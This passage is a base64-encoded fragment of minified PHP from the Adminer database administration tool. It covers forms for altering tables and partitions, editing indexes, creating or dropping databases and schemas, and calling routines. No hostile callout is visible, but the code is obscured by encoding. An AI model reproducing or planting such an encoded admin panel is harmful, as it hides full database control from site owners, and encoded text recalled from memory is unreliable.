JFgpeyRZPSRLWyJwYXJ0aXRpb25fdmFsdWVzIl1bJHhdOyRsZltdPSJcbiAgUEFSVElUSU9OICIuaWRmX2VzY2FwZSgkWCkuIiBWQUxVRVMgIi4oJEtbInBhcnRpdGlvbl9ieSJdPT0nUkFOR0UnPyJMRVNTIFRIQU4iOiJJTiIpLigkWSE9IiI/IiAoJFkpIjoiIE1BWFZBTFVFIik7fX0ka2YuPSJcblBBUlRJVElPTiBCWSAkS1twYXJ0aXRpb25fYnldKCRLW3BhcnRpdGlvbl0pIi4oJGxmPyIgKCIuaW1wbG9kZSgiLCIsJGxmKS4iXG4pIjooJEtbInBhcnRpdGlvbnMiXT8iIFBBUlRJVElPTlMgIi4oKyRLWyJwYXJ0aXRpb25zIl0pOiIiKSk7fWVsc2VpZihzdXBwb3J0KCJwYXJ0aXRpb25pbmciKSYmcHJlZ19tYXRjaCgifnBhcnRpdGlvbmVkfiIsJFJbIkNyZWF0ZV9vcHRpb25zIl0pKSRrZi49IlxuUkVNT1ZFIFBBUlRJVElPTklORyI7JGllPSdUYWJsZSBoYXMgYmVlbiBhbHRlcmVkLic7aWYoJGE9PSIiKXtjb29raWUoImFkbWluZXJfZW5naW5lIiwkS1siRW5naW5lIl0pOyRpZT0nVGFibGUgaGFzIGJlZW4gY3JlYXRlZC4nO30kQz10cmltKCRLWyJuYW1lIl0pO3F1ZXJpZXNfcmVkaXJlY3QoTUUuKHN1cHBvcnQoInRhYmxlIik/InRhYmxlPSI6InNlbGVjdD0iKS51cmxlbmNvZGUoJEMpLCRpZSxhbHRlcl90YWJsZSgkYSwkQywoJHc9PSJzcWxpdGUiJiYoJEtofHwkS2MpPyRDYTokcCksJEtjLCgkS1siQ29tbWVudCJdIT0kUlsiQ29tbWVudCJdPyRLWyJDb21tZW50Il06bnVsbCksKCRLWyJFbmdpbmUiXSYmJEtbIkVuZ2luZSJdIT0kUlsiRW5naW5lIl0/JEtbIkVuZ2luZSJdOiIiKSwoJEtbIkNvbGxhdGlvbiJdJiYkS1siQ29sbGF0aW9uIl0hPSRSWyJDb2xsYXRpb24iXT8kS1siQ29sbGF0aW9uIl06IiIpLCgkS1siQXV0b19pbmNyZW1lbnQiXSE9IiI/bnVtYmVyKCRLWyJBdXRvX2luY3JlbWVudCJdKToiIiksJGtmKSk7fX1wYWdlX2hlYWRlcigoJGEhPSIiPydBbHRlciB0YWJsZSc6J0NyZWF0ZSB0YWJsZScpLCRuLGFycmF5KCJ0YWJsZSI9PiRhKSxoKCRhKSk7aWYoISRfUE9TVCl7JEs9YXJyYXkoIkVuZ2luZSI9PiRfQ09PS0lFWyJhZG1pbmVyX2VuZ2luZSJdLCJmaWVsZHMiPT5hcnJheShhcnJheSgiZmllbGQiPT4iIiwidHlwZSI9Pihpc3NldCgkemhbImludCJdKT8iaW50IjooaXNzZXQoJHpoWyJpbnRlZ2VyIl0pPyJpbnRlZ2VyIjoiIikpKSksInBhcnRpdGlvbl9uYW1lcyI9PmFycmF5KCIiKSwpO2lmKCRhIT0iIil7JEs9JFI7JEtbIm5hbWUiXT0kYTskS1siZmllbGRzIl09YXJyYXkoKTtpZighJF9HRVRbImF1dG9faW5jcmVtZW50Il0pJEtbIkF1dG9faW5jcmVtZW50Il09IiI7Zm9yZWFjaCgkWmUNCmFzJG8peyRvWyJoYXNfZGVmYXVsdCJdPWlzc2V0KCRvWyJkZWZhdWx0Il0pOyRLWyJmaWVsZHMiXVtdPSRvO31pZihzdXBwb3J0KCJwYXJ0aXRpb25pbmciKSl7JFJjPSJGUk9NIGluZm9ybWF0aW9uX3NjaGVtYS5QQVJUSVRJT05TIFdIRVJFIFRBQkxFX1NDSEVNQSA9ICIucShEQikuIiBBTkQgVEFCTEVfTkFNRSA9ICIucSgkYSk7JEk9JGctPnF1ZXJ5KCJTRUxFQ1QgUEFSVElUSU9OX01FVEhPRCwgUEFSVElUSU9OX09SRElOQUxfUE9TSVRJT04sIFBBUlRJVElPTl9FWFBSRVNTSU9OICRSYyBPUkRFUiBCWSBQQVJUSVRJT05fT1JESU5BTF9QT1NJVElPTiBERVNDIExJTUlUIDEiKTtsaXN0KCRLWyJwYXJ0aXRpb25fYnkiXSwkS1sicGFydGl0aW9ucyJdLCRLWyJwYXJ0aXRpb24iXSk9JEktPmZldGNoX3JvdygpOyRsZj1nZXRfa2V5X3ZhbHMoIlNFTEVDVCBQQVJUSVRJT05fTkFNRSwgUEFSVElUSU9OX0RFU0NSSVBUSU9OICRSYyBBTkQgUEFSVElUSU9OX05BTUUgIT0gJycgT1JERVIgQlkgUEFSVElUSU9OX09SRElOQUxfUE9TSVRJT04iKTskbGZbIiJdPSIiOyRLWyJwYXJ0aXRpb25fbmFtZXMiXT1hcnJheV9rZXlzKCRsZik7JEtbInBhcnRpdGlvbl92YWx1ZXMiXT1hcnJheV92YWx1ZXMoJGxmKTt9fX0kbWI9Y29sbGF0aW9ucygpOyRtYz1lbmdpbmVzKCk7Zm9yZWFjaCgkbWMNCmFzJGxjKXtpZighc3RyY2FzZWNtcCgkbGMsJEtbIkVuZ2luZSJdKSl7JEtbIkVuZ2luZSJdPSRsYzticmVhazt9fWVjaG8nDQo8Zm9ybSBhY3Rpb249IiIgbWV0aG9kPSJwb3N0IiBpZD0iZm9ybSI+DQo8cD4NCic7aWYoc3VwcG9ydCgiY29sdW1ucyIpfHwkYT09IiIpe2VjaG8nVGFibGUgbmFtZTogPGlucHV0IG5hbWU9Im5hbWUiIG1heGxlbmd0aD0iNjQiIHZhbHVlPSInLGgoJEtbIm5hbWUiXSksJyIgYXV0b2NhcGl0YWxpemU9Im9mZiI+DQonO2lmKCRhPT0iIiYmISRfUE9TVCl7Pz48c2NyaXB0IHR5cGU9J3RleHQvamF2YXNjcmlwdCc+Zm9jdXMoZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2Zvcm0nKVsnbmFtZSddKTs8L3NjcmlwdD48P3BocCB9ZWNobygkbWM/IjxzZWxlY3QgbmFtZT0nRW5naW5lJyBvbmNoYW5nZT0naGVscENsb3NlKCk7JyIub25faGVscCgiZ2V0VGFyZ2V0KGV2ZW50KS52YWx1ZSIsMSkuIj4iLm9wdGlvbmxpc3QoYXJyYXkoIiI9PiIoIi4nZW5naW5lJy4iKSIpKyRtYywkS1siRW5naW5lIl0pLiI8L3NlbGVjdD4iOiIiKSwnICcsKCRtYiYmIXByZWdfbWF0Y2goIn5zcWxpdGV8bXNzcWx+Iiwkdyk/aHRtbF9zZWxlY3QoIkNvbGxhdGlvbiIsYXJyYXkoIiI9PiIoIi4nY29sbGF0aW9uJy4iKSIpKyRtYiwkS1siQ29sbGF0aW9uIl0pOiIiKSwnIDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJTYXZlIj4NCic7fWVjaG8nDQonO2lmKHN1cHBvcnQoImNvbHVtbnMiKSl7ZWNobyc8dGFibGUgY2VsbHNwYWNpbmc9IjAiIGlkPSJlZGl0LWZpZWxkcyIgY2xhc3M9Im5vd3JhcCI+DQonOyRyYj0oJF9QT1NUPyRfUE9TVFsiY29tbWVudHMiXTokS1siQ29tbWVudCJdIT0iIik7aWYoISRfUE9TVCYmISRyYil7Zm9yZWFjaCgkS1siZmllbGRzIl1hcyRvKXtpZigkb1siY29tbWVudCJdIT0iIil7JHJiPXRydWU7YnJlYWs7fX19ZWRpdF9maWVsZHMoJEtbImZpZWxkcyJdLCRtYiwiVEFCTEUiLCRNYywkcmIpO2VjaG8nPC90YWJsZT4NCjxwPg0KQXV0byBJbmNyZW1lbnQ6IDxpbnB1dCB0eXBlPSJudW1iZXIiIG5hbWU9IkF1dG9faW5jcmVtZW50IiBzaXplPSI2IiB2YWx1ZT0iJyxoKCRLWyJBdXRvX2luY3JlbWVudCJdKSwnIj4NCicsY2hlY2tib3goImRlZmF1bHRzIiwxLHRydWUsJ0RlZmF1bHQgdmFsdWVzJywiY29sdW1uU2hvdyh0aGlzLmNoZWNrZWQsIDUpIiwianNvbmx5Iik7aWYoISRfUE9TVFsiZGVmYXVsdHMiXSl7ZWNobyc8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+ZWRpdGluZ0hpZGVEZWZhdWx0cygpPC9zY3JpcHQ+Jzt9ZWNobyhzdXBwb3J0KCJjb21tZW50Iik/IjxsYWJlbD48aW5wdXQgdHlwZT0nY2hlY2tib3gnIG5hbWU9J2NvbW1lbnRzJyB2YWx1ZT0nMScgY2xhc3M9J2pzb25seScgb25jbGljaz1cImNvbHVtblNob3codGhpcy5jaGVja2VkLCA2KTsgdG9nZ2xlKCdDb21tZW50Jyk7IGlmICh0aGlzLmNoZWNrZWQpIHRoaXMuZm9ybVsnQ29tbWVudCddLmZvY3VzKCk7XCIiLigkcmI/IiBjaGVja2VkIjoiIikuIj4iLidDb21tZW50Jy4iPC9sYWJlbD4iLicgPGlucHV0IG5hbWU9IkNvbW1lbnQiIGlkPSJDb21tZW50IiB2YWx1ZT0iJy5oKCRLWyJDb21tZW50Il0pLiciIG1heGxlbmd0aD0iJy4oJGctPnNlcnZlcl9pbmZvPj01LjU/MjA0ODo2MCkuJyInLigkcmI/Jyc6JyBjbGFzcz0iaGlkZGVuIicpLic+JzonJyksJzxwPg0KPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IlNhdmUiPg0KJzt9ZWNobycNCic7aWYoJGEhPSIiKXtlY2hvJzxpbnB1dCB0eXBlPSJzdWJtaXQiIG5hbWU9ImRyb3AiIHZhbHVlPSJEcm9wIicsY29uZmlybSgpLCc+Jzt9aWYoc3VwcG9ydCgicGFydGl0aW9uaW5nIikpeyRqZj1wcmVnX21hdGNoKCd+UkFOR0V8TElTVH4nLCRLWyJwYXJ0aXRpb25fYnkiXSk7cHJpbnRfZmllbGRzZXQoInBhcnRpdGlvbiIsJ1BhcnRpdGlvbiBieScsJEtbInBhcnRpdGlvbl9ieSJdKTtlY2hvJzxwPg0KJywiPHNlbGVjdCBuYW1lPSdwYXJ0aXRpb25fYnknIG9uY2hhbmdlPSdwYXJ0aXRpb25CeUNoYW5nZSh0aGlzKTsnIi5vbl9oZWxwKCJnZXRUYXJnZXQoZXZlbnQpLnZhbHVlLnJlcGxhY2UoLy4vLCAnUEFSVElUSU9OIEJZIFwkJicpIiwxKS4iPiIub3B0aW9ubGlzdChhcnJheSgiIj0+IiIpKyRpZiwkS1sicGFydGl0aW9uX2J5Il0pLiI8L3NlbGVjdD4iLCcoPGlucHV0IG5hbWU9InBhcnRpdGlvbiIgdmFsdWU9IicsaCgkS1sicGFydGl0aW9uIl0pLCciPikNClBhcnRpdGlvbnM6IDxpbnB1dCB0eXBlPSJudW1iZXIiIG5hbWU9InBhcnRpdGlvbnMiIGNsYXNzPSJzaXplJywoJGpmfHwhJEtbInBhcnRpdGlvbl9ieSJdPyIgaGlkZGVuIjoiIiksJyIgdmFsdWU9IicsaCgkS1sicGFydGl0aW9ucyJdKSwnIj4NCjx0YWJsZSBjZWxsc3BhY2luZz0iMCIgaWQ9InBhcnRpdGlvbi10YWJsZSInLCgkamY/IiI6IiBjbGFzcz0naGlkZGVuJyIpLCc+DQo8dGhlYWQ+PHRyPjx0aD5QYXJ0aXRpb24gbmFtZTx0aD5WYWx1ZXM8L3RoZWFkPg0KJztmb3JlYWNoKCRLWyJwYXJ0aXRpb25fbmFtZXMiXWFzJHg9PiRYKXtlY2hvJzx0cj4nLCc8dGQ+PGlucHV0IG5hbWU9InBhcnRpdGlvbl9uYW1lc1tdIiB2YWx1ZT0iJy5oKCRYKS4nIicuKCR4PT1jb3VudCgkS1sicGFydGl0aW9uX25hbWVzIl0pLTE/JyBvbmNoYW5nZT0icGFydGl0aW9uTmFtZUNoYW5nZSh0aGlzKTsiJzonJykuJyBhdXRvY2FwaXRhbGl6ZT0ib2ZmIj4nLCc8dGQ+PGlucHV0IG5hbWU9InBhcnRpdGlvbl92YWx1ZXNbXSIgdmFsdWU9IicuaCgkS1sicGFydGl0aW9uX3ZhbHVlcyJdWyR4XSkuJyI+Jzt9ZWNobyc8L3RhYmxlPg0KPC9kaXY+PC9maWVsZHNldD4NCic7fWVjaG8nPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0idG9rZW4iIHZhbHVlPSInLCRULCciPg0KPC9mb3JtPg0KJzt9ZWxzZWlmKGlzc2V0KCRfR0VUWyJpbmRleGVzIl0pKXskYT0kX0dFVFsiaW5kZXhlcyJdOyRuZD1hcnJheSgiUFJJTUFSWSIsIlVOSVFVRSIsIklOREVYIik7JFI9dGFibGVfc3RhdHVzKCRhLHRydWUpO2lmKHByZWdfbWF0Y2goJ35NeUlTQU18TT9hcmlhJy4oJGctPnNlcnZlcl9pbmZvPj01LjY/J3xJbm5vREInOicnKS4nfmknLCRSWyJFbmdpbmUiXSkpJG5kW109IkZVTExURVhUIjskdj1pbmRleGVzKCRhKTskemY9YXJyYXkoKTtpZigkdz09Im1vbmdvIil7JHpmPSR2WyJfaWRfIl07dW5zZXQoJG5kWzBdKTt1bnNldCgkdlsiX2lkXyJdKTt9JEs9JF9QT1NUO2lmKCRfUE9TVCYmISRuJiYhJF9QT1NUWyJhZGQiXSYmISRfUE9TVFsiZHJvcF9jb2wiXSl7JGM9YXJyYXkoKTtmb3JlYWNoKCRLWyJpbmRleGVzIl1hcyR1KXskQz0kdVsibmFtZSJdO2lmKGluX2FycmF5KCR1WyJ0eXBlIl0sJG5kKSl7JGY9YXJyYXkoKTskVGQ9YXJyYXkoKTskTmI9YXJyYXkoKTskTz1hcnJheSgpO2tzb3J0KCR1WyJjb2x1bW5zIl0pO2ZvcmVhY2goJHVbImNvbHVtbnMiXWFzJHg9PiRlKXtpZigkZSE9IiIpeyR5PSR1WyJsZW5ndGhzIl1bJHhdOyRNYj0kdVsiZGVzY3MiXVskeF07JE9bXT1pZGZfZXNjYXBlKCRlKS4oJHk/IigiLigrJHkpLiIpIjoiIikuKCRNYj8iIERFU0MiOiIiKTskZltdPSRlOyRUZFtdPSgkeT8keTpudWxsKTskTmJbXT0kTWI7fX1pZigkZil7JHZjPSR2WyRDXTtpZigkdmMpe2tzb3J0KCR2Y1siY29sdW1ucyJdKTtrc29ydCgkdmNbImxlbmd0aHMiXSk7a3NvcnQoJHZjWyJkZXNjcyJdKTtpZigkdVsidHlwZSJdPT0kdmNbInR5cGUiXSYmYXJyYXlfdmFsdWVzKCR2Y1siY29sdW1ucyJdKT09PSRmJiYoISR2Y1sibGVuZ3RocyJdfHxhcnJheV92YWx1ZXMoJHZjWyJsZW5ndGhzIl0pPT09JFRkKSYmYXJyYXlfdmFsdWVzKCR2Y1siZGVzY3MiXSk9PT0kTmIpe3Vuc2V0KCR2WyRDXSk7Y29udGludWU7fX0kY1tdPWFycmF5KCR1WyJ0eXBlIl0sJEMsJE8pO319fWZvcmVhY2goJHYNCmFzJEM9PiR2YykkY1tdPWFycmF5KCR2Y1sidHlwZSJdLCRDLCJEUk9QIik7aWYoISRjKXJlZGlyZWN0KE1FLiJ0YWJsZT0iLnVybGVuY29kZSgkYSkpO3F1ZXJpZXNfcmVkaXJlY3QoTUUuInRhYmxlPSIudXJsZW5jb2RlKCRhKSwnSW5kZXhlcyBoYXZlIGJlZW4gYWx0ZXJlZC4nLGFsdGVyX2luZGV4ZXMoJGEsJGMpKTt9cGFnZV9oZWFkZXIoJ0luZGV4ZXMnLCRuLGFycmF5KCJ0YWJsZSI9PiRhKSxoKCRhKSk7JHA9YXJyYXlfa2V5cyhmaWVsZHMoJGEpKTtpZigkX1BPU1RbImFkZCJdKXtmb3JlYWNoKCRLWyJpbmRleGVzIl1hcyR4PT4kdSl7aWYoJHVbImNvbHVtbnMiXVtjb3VudCgkdVsiY29sdW1ucyJdKV0hPSIiKSRLWyJpbmRleGVzIl1bJHhdWyJjb2x1bW5zIl1bXT0iIjt9JHU9ZW5kKCRLWyJpbmRleGVzIl0pO2lmKCR1WyJ0eXBlIl18fGFycmF5X2ZpbHRlcigkdVsiY29sdW1ucyJdLCdzdHJsZW4nKSkkS1siaW5kZXhlcyJdW109YXJyYXkoImNvbHVtbnMiPT5hcnJheSgxPT4iIikpO31pZighJEspe2ZvcmVhY2goJHYNCmFzJHg9PiR1KXskdlskeF1bIm5hbWUiXT0keDskdlskeF1bImNvbHVtbnMiXVtdPSIiO30kdltdPWFycmF5KCJjb2x1bW5zIj0+YXJyYXkoMT0+IiIpKTskS1siaW5kZXhlcyJdPSR2O30/Pg0KDQo8Zm9ybSBhY3Rpb249IiIgbWV0aG9kPSJwb3N0Ij4NCjx0YWJsZSBjZWxsc3BhY2luZz0iMCIgY2xhc3M9Im5vd3JhcCI+DQo8dGhlYWQ+PHRyPg0KPHRoPkluZGV4IFR5cGUNCjx0aD48aW5wdXQgdHlwZT0ic3VibWl0IiBzdHlsZT0ibGVmdDogLTEwMDBweDsgcG9zaXRpb246IGFic29sdXRlOyI+Q29sdW1uIChsZW5ndGgpDQo8dGg+TmFtZQ0KPHRoPjxub3NjcmlwdD48aW5wdXQgdHlwZT0naW1hZ2UnIGNsYXNzPSdpY29uJyBuYW1lPSdhZGRbMF0nIHNyYz0nIiAuIGgocHJlZ19yZXBsYWNlKCJ+XFw/Lip+IiwgIiIsIE1FKSkgLiAiP2ZpbGU9cGx1cy5naWYmYW1wO3ZlcnNpb249NC4yLjUnIGFsdD0nKycgdGl0bGU9J0FkZCBuZXh0Jz48L25vc2NyaXB0PiZuYnNwOw0KPC90aGVhZD4NCjw/cGhwDQppZigkemYpe2VjaG8iPHRyPjx0ZD5QUklNQVJZPHRkPiI7Zm9yZWFjaCgkemZbImNvbHVtbnMiXWFzJHg9PiRlKXtlY2hvDQpzZWxlY3RfaW5wdXQoIiBkaXNhYmxlZCIsJHAsJGUpLCI8bGFiZWw+PGlucHV0IGRpc2FibGVkIHR5cGU9J2NoZWNrYm94Jz4iLidkZXNjZW5kaW5nJy4iPC9sYWJlbD4gIjt9ZWNobyI8dGQ+PHRkPlxuIjt9JERkPTE7Zm9yZWFjaCgkS1siaW5kZXhlcyJdYXMkdSl7aWYoISRfUE9TVFsiZHJvcF9jb2wiXXx8JERkIT1rZXkoJF9QT1NUWyJkcm9wX2NvbCJdKSl7ZWNobyI8dHI+PHRkPiIuaHRtbF9zZWxlY3QoImluZGV4ZXNbJERkXVt0eXBlXSIsYXJyYXkoLTE9PiIiKSskbmQsJHVbInR5cGUiXSwoJERkPT1jb3VudCgkS1siaW5kZXhlcyJdKT8iaW5kZXhlc0FkZFJvdyh0aGlzKTsiOjEpKSwiPHRkPiI7a3NvcnQoJHVbImNvbHVtbnMiXSk7JHM9MTtmb3JlYWNoKCR1WyJjb2x1bW5zIl1hcyR4PT4kZSl7ZWNobyI8c3Bhbj4iLnNlbGVjdF9pbnB1dCgiIG5hbWU9J2luZGV4ZXNbJERkXVtjb2x1bW5zXVskc10nIG9uY2hhbmdlPVwiIi4oJHM9PWNvdW50KCR1WyJjb2x1bW5zIl0pPyJpbmRleGVzQWRkQ29sdW1uIjoiaW5kZXhlc0NoYW5nZUNvbHVtbiIpLiIodGhpcywgJyIuaChqc19lc2NhcGUoJHc9PSJzcWwiPyIiOiRfR0VUWyJpbmRleGVzIl0uIl8iKSkuIicpO1wiIiwoJHA/YXJyYXlfY29tYmluZSgkcCwkcCk6JHApLCRlKSwoJHc9PSJzcWwifHwkdz09Im1zc3FsIj8iPGlucHV0IHR5cGU9J251bWJlcicgbmFtZT0naW5kZXhlc1skRGRdW2xlbmd0aHNdWyRzXScgY2xhc3M9J3NpemUnIHZhbHVlPSciLmgoJHVbImxlbmd0aHMiXVskeF0pLiInPiI6IiIpLCgkdyE9InNxbCI/Y2hlY2tib3goImluZGV4ZXNbJERkXVtkZXNjc11bJHNdIiwxLCR1WyJkZXNjcyJdWyR4XSwnZGVzY2VuZGluZycpOiIiKSwiIDwvc3Bhbj4iOyRzKys7fWVjaG8iPHRkPjxpbnB1dCBuYW1lPSdpbmRleGVzWyREZF1bbmFtZV0nIHZhbHVlPSciLmgoJHVbIm5hbWUiXSkuIicgYXV0b2NhcGl0YWxpemU9J29mZic+XG4iLCI8dGQ+PGlucHV0IHR5cGU9J2ltYWdlJyBjbGFzcz0naWNvbicgbmFtZT0nZHJvcF9jb2xbJERkXScgc3JjPSciLmgocHJlZ19yZXBsYWNlKCJ+XFw/Lip+IiwiIixNRSkpLiI/ZmlsZT1jcm9zcy5naWYmYW1wO3ZlcnNpb249NC4yLjUnIGFsdD0neCcgdGl0bGU9JyIuJ1JlbW92ZScuIicgb25jbGljaz1cInJldHVybiAhZWRpdGluZ1JlbW92ZVJvdyh0aGlzLCAnaW5kZXhlc1wkMVt0eXBlXScpO1wiPlxuIjt9JERkKys7fWVjaG8nPC90YWJsZT4NCjxwPg0KPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IlNhdmUiPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0idG9rZW4iIHZhbHVlPSInLCRULCciPg0KPC9mb3JtPg0KJzt9ZWxzZWlmKGlzc2V0KCRfR0VUWyJkYXRhYmFzZSJdKSl7JEs9JF9QT1NUO2lmKCRfUE9TVCYmISRuJiYhaXNzZXQoJF9QT1NUWyJhZGRfeCJdKSl7JEM9dHJpbSgkS1sibmFtZSJdKTtpZigkX1BPU1RbImRyb3AiXSl7JF9HRVRbImRiIl09IiI7cXVlcmllc19yZWRpcmVjdChyZW1vdmVfZnJvbV91cmkoImRifGRhdGFiYXNlIiksJ0RhdGFiYXNlIGhhcyBiZWVuIGRyb3BwZWQuJyxkcm9wX2RhdGFiYXNlcyhhcnJheShEQikpKTt9ZWxzZWlmKERCIT09JEMpe2lmKERCIT0iIil7JF9HRVRbImRiIl09JEM7cXVlcmllc19yZWRpcmVjdChwcmVnX3JlcGxhY2UoJ35cYmRiPVteJl0qJn4nLCcnLE1FKS4iZGI9Ii51cmxlbmNvZGUoJEMpLCdEYXRhYmFzZSBoYXMgYmVlbiByZW5hbWVkLicscmVuYW1lX2RhdGFiYXNlKCRDLCRLWyJjb2xsYXRpb24iXSkpO31lbHNleyRsPWV4cGxvZGUoIlxuIixzdHJfcmVwbGFjZSgiXHIiLCIiLCRDKSk7JEtnPXRydWU7JE5kPSIiO2ZvcmVhY2goJGwNCmFzJG0pe2lmKGNvdW50KCRsKT09MXx8JG0hPSIiKXtpZighY3JlYXRlX2RhdGFiYXNlKCRtLCRLWyJjb2xsYXRpb24iXSkpJEtnPWZhbHNlOyROZD0kbTt9fXJlc3RhcnRfc2Vzc2lvbigpO3NldF9zZXNzaW9uKCJkYnMiLG51bGwpO3F1ZXJpZXNfcmVkaXJlY3QoTUUuImRiPSIudXJsZW5jb2RlKCROZCksJ0RhdGFiYXNlIGhhcyBiZWVuIGNyZWF0ZWQuJywkS2cpO319ZWxzZXtpZighJEtbImNvbGxhdGlvbiJdKXJlZGlyZWN0KHN1YnN0cihNRSwwLC0xKSk7cXVlcnlfcmVkaXJlY3QoIkFMVEVSIERBVEFCQVNFICIuaWRmX2VzY2FwZSgkQykuKHByZWdfbWF0Y2goJ35eW2EtejAtOV9dKyR+aScsJEtbImNvbGxhdGlvbiJdKT8iIENPTExBVEUgJEtbY29sbGF0aW9uXSI6IiIpLHN1YnN0cihNRSwwLC0xKSwnRGF0YWJhc2UgaGFzIGJlZW4gYWx0ZXJlZC4nKTt9fXBhZ2VfaGVhZGVyKERCIT0iIj8nQWx0ZXIgZGF0YWJhc2UnOidDcmVhdGUgZGF0YWJhc2UnLCRuLGFycmF5KCksaChEQikpOyRtYj1jb2xsYXRpb25zKCk7JEM9REI7aWYoJF9QT1NUKSRDPSRLWyJuYW1lIl07ZWxzZWlmKERCIT0iIikkS1siY29sbGF0aW9uIl09ZGJfY29sbGF0aW9uKERCLCRtYik7ZWxzZWlmKCR3PT0ic3FsIil7Zm9yZWFjaChnZXRfdmFscygiU0hPVyBHUkFOVFMiKWFzJFRjKXtpZihwcmVnX21hdGNoKCd+IE9OIChgKChbXlxcXFxgXXxgYHxcXFxcLikqKSVgXFwuXFwqKT9+JywkVGMsJEIpJiYkQlsxXSl7JEM9c3RyaXBjc2xhc2hlcyhpZGZfdW5lc2NhcGUoImAkQlsyXWAiKSk7YnJlYWs7fX19ZWNobycNCjxmb3JtIGFjdGlvbj0iIiBtZXRob2Q9InBvc3QiPg0KPHA+DQonLCgkX1BPU1RbImFkZF94Il18fHN0cnBvcygkQywiXG4iKT8nPHRleHRhcmVhIGlkPSJuYW1lIiBuYW1lPSJuYW1lIiByb3dzPSIxMCIgY29scz0iNDAiPicuaCgkQykuJzwvdGV4dGFyZWE+PGJyPic6JzxpbnB1dCBuYW1lPSJuYW1lIiBpZD0ibmFtZSIgdmFsdWU9IicuaCgkQykuJyIgbWF4bGVuZ3RoPSI2NCIgYXV0b2NhcGl0YWxpemU9Im9mZiI+JykuIlxuIi4oJG1iP2h0bWxfc2VsZWN0KCJjb2xsYXRpb24iLGFycmF5KCIiPT4iKCIuJ2NvbGxhdGlvbicuIikiKSskbWIsJEtbImNvbGxhdGlvbiJdKS5kb2NfbGluayhhcnJheSgnc3FsJz0+ImNoYXJzZXQtY2hhcnNldHMuaHRtbCIsJ21zc3FsJz0+Im1zMTg3OTYzLmFzcHgiLCkpOiIiKTs/Pg0KPHNjcmlwdCB0eXBlPSd0ZXh0L2phdmFzY3JpcHQnPmZvY3VzKGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCduYW1lJykpOzwvc2NyaXB0Pg0KPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IlNhdmUiPg0KPD9waHANCmlmKERCIT0iIillY2hvIjxpbnB1dCB0eXBlPSdzdWJtaXQnIG5hbWU9J2Ryb3AnIHZhbHVlPSciLidEcm9wJy4iJyIuY29uZmlybSgpLiI+XG4iO2Vsc2VpZighJF9QT1NUWyJhZGRfeCJdJiYkX0dFVFsiZGIiXT09IiIpZWNobyI8aW5wdXQgdHlwZT0naW1hZ2UnIGNsYXNzPSdpY29uJyBuYW1lPSdhZGQnIHNyYz0nIi5oKHByZWdfcmVwbGFjZSgiflxcPy4qfiIsIiIsTUUpKS4iP2ZpbGU9cGx1cy5naWYmYW1wO3ZlcnNpb249NC4yLjUnIGFsdD0nKycgdGl0bGU9JyIuJ0FkZCBuZXh0Jy4iJz5cbiI7ZWNobyc8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJ0b2tlbiIgdmFsdWU9IicsJFQsJyI+DQo8L2Zvcm0+DQonO31lbHNlaWYoaXNzZXQoJF9HRVRbInNjaGVtZSJdKSl7JEs9JF9QT1NUO2lmKCRfUE9TVCYmISRuKXskXz1wcmVnX3JlcGxhY2UoJ35ucz1bXiZdKiZ+JywnJyxNRSkuIm5zPSI7aWYoJF9QT1NUWyJkcm9wIl0pcXVlcnlfcmVkaXJlY3QoIkRST1AgU0NIRU1BICIuaWRmX2VzY2FwZSgkX0dFVFsibnMiXSksJF8sJ1NjaGVtYSBoYXMgYmVlbiBkcm9wcGVkLicpO2Vsc2V7JEM9dHJpbSgkS1sibmFtZSJdKTskXy49dXJsZW5jb2RlKCRDKTtpZigkX0dFVFsibnMiXT09IiIpcXVlcnlfcmVkaXJlY3QoIkNSRUFURSBTQ0hFTUEgIi5pZGZfZXNjYXBlKCRDKSwkXywnU2NoZW1hIGhhcyBiZWVuIGNyZWF0ZWQuJyk7ZWxzZWlmKCRfR0VUWyJucyJdIT0kQylxdWVyeV9yZWRpcmVjdCgiQUxURVIgU0NIRU1BICIuaWRmX2VzY2FwZSgkX0dFVFsibnMiXSkuIiBSRU5BTUUgVE8gIi5pZGZfZXNjYXBlKCRDKSwkXywnU2NoZW1hIGhhcyBiZWVuIGFsdGVyZWQuJyk7ZWxzZQ0KcmVkaXJlY3QoJF8pO319cGFnZV9oZWFkZXIoJF9HRVRbIm5zIl0hPSIiPydBbHRlciBzY2hlbWEnOidDcmVhdGUgc2NoZW1hJywkbik7aWYoISRLKSRLWyJuYW1lIl09JF9HRVRbIm5zIl07ZWNobycNCjxmb3JtIGFjdGlvbj0iIiBtZXRob2Q9InBvc3QiPg0KPHA+PGlucHV0IG5hbWU9Im5hbWUiIGlkPSJuYW1lIiB2YWx1ZT0iJyxoKCRLWyJuYW1lIl0pOz8+IiBhdXRvY2FwaXRhbGl6ZT0ib2ZmIj4NCjxzY3JpcHQgdHlwZT0ndGV4dC9qYXZhc2NyaXB0Jz5mb2N1cyhkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbmFtZScpKTs8L3NjcmlwdD4NCjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJTYXZlIj4NCjw/cGhwDQppZigkX0dFVFsibnMiXSE9IiIpZWNobyI8aW5wdXQgdHlwZT0nc3VibWl0JyBuYW1lPSdkcm9wJyB2YWx1ZT0nIi4nRHJvcCcuIiciLmNvbmZpcm0oKS4iPlxuIjtlY2hvJzxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InRva2VuIiB2YWx1ZT0iJywkVCwnIj4NCjwvZm9ybT4NCic7fWVsc2VpZihpc3NldCgkX0dFVFsiY2FsbCJdKSl7JGRhPSRfR0VUWyJjYWxsIl07cGFnZV9oZWFkZXIoJ0NhbGwnLiI6ICIuaCgkZGEpLCRuKTskZWc9cm91dGluZSgkZGEsKGlzc2V0KCRfR0VUWyJjYWxsZiJdKT8iRlVOQ1RJT04iOiJQUk9DRURVUkUiKSk7JGxkPWFycmF5KCk7JGNmPWFycmF5KCk7Zm9yZWFjaCgkZWdbImZpZWxkcyJdYXMkcz0+JG8pe2lmKHN1YnN0cigkb1siaW5vdXQiXSwtMyk9PSJPVVQiKSRjZlskc109IkAiLmlk